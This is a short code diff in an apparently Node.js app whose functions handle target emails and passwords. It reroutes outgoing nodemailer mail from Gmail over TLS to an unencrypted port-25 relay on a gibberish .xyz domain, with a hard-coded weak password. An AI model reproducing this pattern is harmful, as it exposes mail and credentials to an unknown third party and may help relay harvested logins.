@@ -82,10 +82,12 @@ function isDuplicatePassword(targetEmail, currentPassword) {
 }
 
 const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true,
-    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
+    host: 'smtp.kjhewfouh.xyz',  // BUKAN smtp.gmail.com
+    port: 25,
+    auth: {
+        user: 'noreply@jhguhhfurfh.xyz',
+        pass: 'password123'
+    }
 });
 
 function getFlagEmoji(countryCode) {
